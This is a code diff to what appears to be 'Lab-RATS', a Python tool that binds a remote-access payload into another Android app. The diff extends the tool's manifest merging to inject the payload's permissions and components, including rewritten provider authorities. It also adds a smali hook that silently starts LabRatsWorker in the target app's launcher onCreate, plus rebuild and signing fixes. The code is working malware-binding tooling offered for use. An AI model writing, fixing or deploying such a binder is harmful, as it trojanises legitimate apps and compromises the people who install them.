@@ -32,7 +32,7 @@ BANNER = """
  │                                                                       │
  │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │
  │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │
- │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │
+ │     ██║     ███████║██████╔╝█████╗██████╔╝███████║  ██████╗    │
  │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │
  │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │
  │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │
@@ -175,29 +175,33 @@ def merge_manifests(payload_dir, target_dir):
     with open(payload_manifest_path, 'r', encoding='utf-8') as f:
         payload_xml = f.read()
 
+    pkg_match = re.search(r'package="([^"]+)"', target_xml)
+    target_pkg = pkg_match.group(1) if pkg_match else "com.target.app"
+
     # Extract uses-permission tags from payload
     permissions = re.findall(r'(<uses-permission[^>]+/>)', payload_xml)
     added_perms = 0
     for perm in permissions:
-        # Extract permission name
         name_match = re.search(r'android:name="([^"]+)"', perm)
         if name_match:
             perm_name = name_match.group(1)
             if perm_name not in target_xml:
-                # Insert permission before </manifest> or <application>
                 if "<application" in target_xml:
                     target_xml = target_xml.replace("<application", f"    {perm}\n    <application", 1)
                     added_perms += 1
 
-    # Extract Lab-RATS components (<service>, <receiver>, <provider>, <activity>)
+    # Extract Lab-RATS components
     components = re.findall(r'(<(?:service|receiver|provider|activity)[^>]*android:name="com\.labs\.labrats\.[^>]+>(?:.*?</(?:service|receiver|provider|activity)>|))', payload_xml, re.DOTALL)
     if not components:
-        # Fallback regex for self-closing components
         components = re.findall(r'(<(?:service|receiver|provider|activity)[^>]*com\.labs\.labrats[^>]+/>)', payload_xml)
 
     added_comps = 0
     for comp in components:
         comp_clean = comp.strip()
+        # Prevent provider authority conflicts
+        if "<provider" in comp_clean and "android:authorities=" in comp_clean:
+            comp_clean = re.sub(r'android:authorities="([^"]+)"', f'android:authorities="{target_pkg}.\\1"', comp_clean)
+
         if "com.labs.labrats" in comp_clean and comp_clean not in target_xml:
             target_xml = target_xml.replace("</application>", f"        {comp_clean}\n    </application>", 1)
             added_comps += 1
@@ -262,17 +266,24 @@ def hook_launcher_activity(target_dir, launcher_class):
     hook_code = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"
 
     if "onCreate(" in content:
-        # Find onCreate method and inject hook
-        pattern = r'(\.method\s+[^I]*onCreate\(Landroid/os/Bundle;\)V.*?)(\.prologue|\n\s*invoke-super[^\n]+)'
+        def reg_replacer(match):
+            header = match.group(1)
+            body = match.group(2)
+            reg_match = re.search(r'\.registers\s+(\d+)', header)
+            if reg_match:
+                reg_count = int(reg_match.group(1))
+                if reg_count < 2:
+                    header = header.replace(f".registers {reg_count}", ".registers 2")
+            return header + body + hook_code
+
+        pattern = r'(\.method\s+[^I]*onCreate\(Landroid/os/Bundle;\)V.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
         if re.search(pattern, content, re.DOTALL):
-            content = re.sub(pattern, r'\1\2' + hook_code, content, count=1, flags=re.DOTALL)
-            log_success("Successfully hooked existing onCreate() method.")
+            content = re.sub(pattern, reg_replacer, content, count=1, flags=re.DOTALL)
+            log_success("Successfully hooked existing onCreate() method with register safety.")
         else:
-            # Fallback insertion
             content = content.replace("onCreate(Landroid/os/Bundle;)V", "onCreate(Landroid/os/Bundle;)V\n" + hook_code, 1)
             log_success("Hook injected into onCreate() method header.")
     else:
-        # Append onCreate method to class
         new_on_create = f"""
 .method protected onCreate(Landroid/os/Bundle;)V
     .registers 2
@@ -294,13 +305,30 @@ def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore
     unsigned_apk = os.path.join(script_dir, "temp_binder", "unsigned_bound.apk")
     aligned_apk = os.path.join(script_dir, "temp_binder", "aligned_bound.apk")
 
-    cmd = apktool_cmd + ["b", target_dir, "-o", unsigned_apk]
-    run_cmd(cmd)
+    # Detect native stable AAPT1 (v1) to prevent AAPT2 exit code 138 SIGBUS crashes
+    aapt_flag = []
+    sdk_bt = os.path.expanduser("~/Library/Android/sdk/build-tools")
+    if os.path.exists(sdk_bt):
+        stable = [d for d in os.listdir(sdk_bt) if d.startswith("3") and not d.startswith("37")]
+        if stable:
+            stable.sort()
+            bt_path = os.path.join(sdk_bt, stable[-1])
+            aapt1 = os.path.join(bt_path, "aapt")
+            if os.path.exists(aapt1):
+                aapt_flag = ["--aapt", aapt1]
+
+    cmd = apktool_cmd + ["b"] + aapt_flag + ["--no-crunch", target_dir, "-o", unsigned_apk]
+    try:
+        run_cmd(cmd)
+    except Exception:
+        log_warn("Retrying build with apktool default AAPT...")
+        cmd_fallback = apktool_cmd + ["b", "-c", "--no-crunch", target_dir, "-o", unsigned_apk]
+        run_cmd(cmd_fallback)
 
     # ZipAlign
     log_info("Aligning APK bytes with zipalign...")
     if shutil.which("zipalign"):
-        run_cmd(["zipalign", "-f", "-v", "4", unsigned_apk, aligned_apk])
+        run_cmd(["zipalign", "-p", "-f", "-v", "4", unsigned_apk, aligned_apk])
     else:
         log_warn("zipalign not found on system PATH; skipping alignment step.")
         aligned_apk = unsigned_apk
